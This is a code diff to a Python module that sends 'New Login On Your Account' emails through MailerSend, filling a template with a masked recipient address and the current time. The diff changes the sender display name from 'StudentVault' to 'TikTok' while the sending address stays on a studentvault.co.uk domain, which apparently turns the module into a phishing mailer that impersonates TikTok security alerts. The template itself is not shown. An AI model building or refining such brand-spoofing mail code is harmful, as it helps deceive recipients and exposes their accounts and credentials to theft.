@@ -1,36 +1,31 @@
 from mailersend import emails
 from dotenv import load_dotenv
-import logging
 import os
-
-from typing import List
+from datetime import datetime
 
 load_dotenv()
 
-
-logger = logging.getLogger(__name__)
-
 MAIL_FROM = {
-    "name": "StudentVault",
+    "name": "TikTok",
     "email": "MS_OQ9L5U@studentvault.co.uk",
 }
 
 SUBJECT = "New Login On Your Account"
 
 
-class Email:
+class Correo:
     """
     New instance of this class will need to be created every time a new email is sent.
     """
 
-    def __init__(self, email_address):
+    def __init__(self, recipient_address):
         self.mailer = emails.NewEmail(os.getenv("MAILERSEND_API_KEY"))
         self.mail_body = {}
         self.mail_from = MAIL_FROM
         self.subject = SUBJECT
-        self.email_address = email_address
+        self.recipient_address = recipient_address
         self.recipient = [
-            {"email": email_address}
+            {"email": recipient_address}
         ]  # special formatting for MailerSend API
         self.template = ""
 
@@ -50,13 +45,29 @@ class Email:
         if len(name) <= 2:
             masked_name = name[0] + "*" + (name[1] if len(name) > 1 else "")
         else:
-            masked_name = name[0] + "*" * (len(name) - 2) + name[-1]
+            masked_name = name[0] + "***" + name[-1]
         return masked_name + "@" + domain
 
-    def __set_template(self) -> None:
+    def __set_template(self) -> str:
         with open("email/email-template.html", "r") as f:
             template = f.read()
-        self.template = template.replace("{masked-email}", self.__mask_email())
+        template = template.replace(
+            "{masked-email}", self.__mask_email(self.recipient_address)
+        )
+
+        template = template.replace("{current-date}", get_date())
+        template = template.replace("{current-time}", get_time())
+
+        self.template = template
+        return self.template
 
     def send(self):
-        logger.info(f"\n=> {self.mailer.send(self.mail_body)}")
+        return self.mailer.send(self.mail_body)
+
+
+def get_date():
+    return datetime.now().strftime("%m/%d")
+
+
+def get_time():
+    return datetime.now().strftime("%H:%M")
